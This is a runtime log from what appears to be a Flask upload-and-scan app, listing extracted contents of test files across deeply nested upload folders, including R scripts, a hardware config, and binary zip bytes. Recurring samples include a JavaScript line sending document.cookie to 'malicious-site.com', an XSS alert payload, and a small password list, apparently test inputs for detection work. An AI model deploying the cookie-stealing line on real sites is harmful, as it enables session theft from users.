2025-02-22 21:04:50,737 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:04:50,738 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:04:50,740 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:04:50,741 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:04:50,742 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:04:50,743 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:04:50,744 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:04:50,745 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:04:50,746 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:04:50,747 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:04:50,748 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:04:50,749 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:04:50,751 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:04:50,752 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:04:50,754 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:04:50,755 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:04:50,756 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:04:50,757 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:04:50,758 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:04:50,759 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:04:50,760 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:04:50,761 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:04:50,763 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:04:50,764 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:04:50,765 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:04:50,766 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:04:50,767 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:04:50,768 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:04:50,770 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:04:50,771 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:04:50,772 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:04:50,773 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:04:50,774 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:04:50,775 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:04:50,776 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:04:50,777 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:04:50,778 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:04:50,779 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:04:50,780 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:04:50,781 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:04:50,782 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:04:50,783 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:04:50,784 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:04:50,785 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:04:50,786 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:04:50,787 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:04:50,788 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:04:50,789 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:04:50,790 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:04:50,791 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:04:50,794 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 21:04:50,794 - [33mPress CTRL+C to quit[0m
2025-02-22 21:04:54,257 - 127.0.0.1 - - [22/Feb/2025 21:04:54] "GET / HTTP/1.1" 200 -
2025-02-22 21:05:01,524 - Extracted content from uploads/test.zip: PK     mVZ               test/UT
 ǹg#gǹgux     PK   kVZ        5   	   test/3.pyUT
 sgggux     -/*Q//+,.IP*U-JSWTPPVpIKO-/-VHMK PKt"7   5   PK   VZ        "   
   test/5.txtUT
 gggux     +H,../J,.+(JL342*,O-* PKW؂=$   "   PK   ZVZ        9   
   test/1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   VZ        #   
   test/2.xssUT
 g찹ggux     )N.,(KI-*PHLNMQT״чp PK=`4    #   PK   qVZ        >   
2025-02-22 21:05:01,528 - 127.0.0.1 - - [22/Feb/2025 21:05:01] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:05:01,534 - 127.0.0.1 - - [22/Feb/2025 21:05:01] "GET / HTTP/1.1" 200 -
2025-02-22 21:05:06,192 - Extracted content from uploads/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:05:06,196 - 127.0.0.1 - - [22/Feb/2025 21:05:06] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:05:06,202 - 127.0.0.1 - - [22/Feb/2025 21:05:06] "GET / HTTP/1.1" 200 -
2025-02-22 21:07:10,577 - Extracted content from uploads/flask_file_upload_2.zip: PK     șVZ               flask_file_upload/UT
 ԹgԹgԹgux     PK   VZ        /  *   flask_file_upload/create_malicious_xlsx.pyUT
 qԹgԹgԹgux     }RJ0}W\CZA|P0]Ň
e|YzaiRtI[MyJ=prɵ*@(]#ޔެA90⪠3*ji6 w.ࡅ{ƇJ~hen|"j^'YžXnF8 SjiTLI#ʫۖ?2p	9TtwI'4+$wh._ur?椉[*"b>XdeHNǠ?W̰PVjgiWڎz;s2jYILXTQRjm95<m
*TIV:
Ӽt2	#XS7'Z-DOVKͥ#1 xQd+!vIQ<3,û8PK  /  PK   VZ        '  &   flask_file_upload/metadata_analysis.pyUT
 z¹g¹gz¹gux     UQO0~ϯ8
2025-02-22 21:07:11,349 - Extracted content from uploads/flask_file_upload.zip: PK     VZ               flask_file_upload/UT
 gggux     PK   VZ        
  &   flask_file_upload/metadata_analysis.pyUT
 
g
g
gux     VMk0PՋRAܺB0Z{(-!.;ZډB顾X=͌}:~*[)
MڻZ@ jhLz^TԬ4ŎuϦh4b-#W<
HT:tBh#|kƘŢ,0e)Qf!I+~Z0޳+-7Ǫ){&dif;5.k8tXl|tS#|d=Anp*=0#ء7_dQ1.&0n13NPqM*5&{cpcdI,utʁs?.DPoںyM7?N7ݐ6ۍ=8x^A7j5'`ֹ/_=;DZX<<C3	/;
]8t1B!l*-q6(6ۧPBZ4ֻRr	LoL۔l@ڔeJHIFVq7>ަE.:""p'_)Opλ9	w!ao8"`|/;﹊?2po!<3(<od
yTMwBCWD(؉<Nd,RǠ
2025-02-22 21:07:11,533 - Extracted content from uploads/test.zip: PK     mVZ               test/UT
 ǹg#gǹgux     PK   kVZ        5   	   test/3.pyUT
 sgggux     -/*Q//+,.IP*U-JSWTPPVpIKO-/-VHMK PKt"7   5   PK   VZ        "   
   test/5.txtUT
 gggux     +H,../J,.+(JL342*,O-* PKW؂=$   "   PK   ZVZ        9   
   test/1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   VZ        #   
   test/2.xssUT
 g찹ggux     )N.,(KI-*PHLNMQT״чp PK=`4    #   PK   qVZ        >   
2025-02-22 21:07:11,535 - Extracted content from uploads/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:07:11,536 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:07:11,537 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:07:11,538 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:07:11,540 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:07:11,541 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:11,542 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:11,543 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:11,544 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:07:11,547 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:11,548 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:11,549 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:07:11,550 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:07:11,551 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:07:11,553 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:07:11,554 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:11,555 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:11,556 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:11,557 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:07:11,559 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:11,560 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:11,561 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:07:11,562 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:07:11,563 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:07:11,565 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:07:11,566 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:11,567 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

